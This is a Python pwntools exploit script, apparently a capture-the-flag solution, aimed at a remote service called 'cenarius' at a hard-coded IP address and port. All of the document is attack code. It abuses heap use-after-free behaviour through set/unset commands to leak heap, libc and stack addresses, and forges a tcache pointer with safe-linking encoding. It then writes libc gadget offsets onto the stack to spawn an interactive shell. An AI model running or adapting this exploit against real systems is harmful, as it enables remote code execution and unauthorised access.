from pwn import *

e = ELF('./cenarius')

#p = process(e.path, aslr=True)
p = remote('141.164.48.191', 10002)

sla = p.sendlineafter
sa = p.sendafter

gol = lambda x:sla('$ ', x)
go = lambda x:sa('$ ', x)

go('set %s=%s'%('A'*8, 'A'*0x10))
go('set %s=%s'%('B'*8, 'B'*0x10))
go('set %s=%s'%('C'*8, 'C'*0x10))
go('set %s=%s'%('D'*9, 'D'*0x10))
go('set %s=%s'%('E'*8, 'E'*0x10))
go('unset '+ 'E'*8)
go('unset '+ 'B'*8)
go('unset '+ 'C'*8)

go('set %s=%s'%('D', 'F'*0x18 + '\x98'))
go('echo D')
p.recvuntil('D: ')
heap = u64(p.recvline()[:-1].ljust(8, b'\x00')) << 12

log.info('[HEAP] %#x'%heap)

go('unset ' + 'A'*8)

for i in range(9):
    go('set %s=%s'%(str(i)*8, str(i)*0x80))

for i in range(9, 2, -1):
    go('unset %s'%(str(i)*8))

for i in range(2):
    go('unset %s'%(str(i)*8))

def encode(val, key):
  val = (val ^ (key >> 12))
  return val


go('set %s=%s'%('A'*8, 'A'*0x10))
go('set %s=%s'%('B'*8, 'B'*0x10))
go('set %s=%s'%('C'*8, 'C'*0x10))

go('unset ' + 'B'*8)
go('unset ' + 'C'*8)

pay = b'ipwn'.ljust(0x10, b'\x00')
pay += p64(heap + 0x4c0) + p64(0)
go(b'set %s=%s'%(b'Z'*8, pay))
go('echo ipwn')
libc = u64(p.recvuntil('\x7f')[-6:] + b'\x00\x00') - 0x218cc0
log.info('[GLIBC] %#x'%libc)
go('unset ' + 'A'*8)

go('set %s=%s'%('A'*8, 'A'*0x10))
go('set %s=%s'%('B'*8, 'B'*0x10))
go('set %s=%s'%('C'*8, 'C'*0x10))

go('unset ' + 'B'*8)
go('unset ' + 'C'*8)

pay = b'ipwn'.ljust(0x10, b'\x00')
pay += p64(libc + 0x220ec0) + p64(0)
go(b'set %s=%s'%(b'Z'*8, pay))
go('echo ipwn')
stack = u64(p.recvuntil('\x7f')[-6:] + b'\x00\x00') - 0x8
log.info('[STACK] %#x'%stack)
go('unset ' + 'A'*8)

fake = b'D' * 0x10 + p64(0) + p64(0x51) + p64(0) * 0x8

go('set %s=%s'%('A'*8, 'A'*0x10))
go('set %s=%s'%('B'*8, 'B'*0x10))
go('set %s=%s'%('C'*8, 'C'*0x10))
go(b'set %s=%s'%(b'D'*8, fake))
go(b'set %s=%s'%(b'E'*8, b'E'*0x40))

go('unset ' + 'B'*8)
go('unset ' + 'C'*8)
pay = b'ipwn'.ljust(0x10, b'\x00')
pay += p64(heap + 0x4e0) + p64(heap + 0x3e0)
go(b'set %s=%s'%(b'Z'*8, pay))
go('unset ' + 'E'*8)
go('unset ' + 'ipwn')
go('unset ' + 'D'*8)
pay = b'D' * 0x10 + p64(0) + p64(0x51) + p64(encode(stack - 0x670, heap)) + p64(0) * 7

go(b'set %s=%s'%(b'GO0', pay))
go(b'set %s=%s'%(b'GO1', b'G'*0x40))
go(b'set %s=%s'%(b'GO2', p64(0) + p64(libc + 0x0016c426) + p64(libc + 0x0016c425) + p64(libc + 0x1dbcba) + p64(libc + 0x54ae0) + p64(0)*3))

p.interactive()